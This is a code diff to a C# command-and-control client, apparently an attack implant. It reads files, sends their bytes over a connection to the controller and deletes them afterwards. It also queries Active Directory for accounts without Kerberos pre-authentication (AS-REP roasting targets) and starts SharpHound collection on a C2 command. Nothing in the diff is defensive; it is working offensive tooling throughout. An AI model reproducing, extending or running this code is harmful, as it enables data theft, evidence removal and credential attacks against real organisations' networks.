@@ -136,12 +136,12 @@ namespace C2Client
                 {
                     Console.WriteLine(f);
 
-                    byte[] b = File.ReadAllBytes(f);
+                    
                     //Thread.Sleep(5000);
                     //File.WriteAllBytes(@"C:\Windows\Temp\test.zip", b);
                     //string b64 =Convert.ToBase64String(b);
-                    c.Send(b);
-                    Console.WriteLine(b.Length);
+                    c.Send(File.ReadAllBytes(f));
+                   Console.WriteLine(File.ReadAllBytes(f).Length);
                     // Thread.Sleep(2000);
                     File.Delete(f);
 
@@ -180,12 +180,12 @@ namespace C2Client
                 DomainCollection domains = f.Domains;
                 foreach (Domain d in domains)
                 {
-                    string domainName= d.Name.ToString();
+                    string domainName = d.Name.ToString();
                     string[] dcs = domainName.Split('.');
                     for (int i = 0; i < dcs.Length; i++)
                     {
                         dcs[i] = "DC=" + dcs[i];
-                        
+
                     }
 
                     StringWriter sw = new StringWriter();
@@ -195,7 +195,7 @@ namespace C2Client
                     DirectorySearcher ds = new DirectorySearcher();
                     ds.SearchRoot = de;
                     ds.Filter = "(&(objectclass=user)(useraccountcontrol>=4194304))";
-                    foreach(SearchResult sr in ds.FindAll())
+                    foreach (SearchResult sr in ds.FindAll())
                     {
                         sw.WriteLine("User: {0} from Domain: {1}", sr.Properties["samaccountname"][0], domainName);
                         sw.WriteLine("UserAccountControl: {0}", sr.Properties["useraccountcontrol"][0]);
@@ -219,21 +219,21 @@ namespace C2Client
                             sw.WriteLine(temp);
                         }
                         sw.WriteLine();
-                       
+
                     }
 
                     result += sw.ToString();
 
 
                 }
-                Console.WriteLine("Result is-->{0}<--",result);
-                if (result=="")
+                Console.WriteLine("Result is-->{0}<--", result);
+                if (result == "")
                 {
                     result = "No accounts found";
                 }
             }
 
-            catch(Exception e)
+            catch (Exception e)
             {
                 result = e.Message;
             }
@@ -321,8 +321,8 @@ namespace C2Client
                         Thread sharp = new Thread(() => { cmd = p.GetSharpHoundZip(cs, payload); });
                         sharp.Name = "Sharphoundzip";
                         sharp.Start();
-
-                        Thread.Sleep(6000);
+                        sharp.Join();
+                        Thread.Sleep(2000);
 
                     }
                     else if (cmd == "Get-ASREPRoastable")
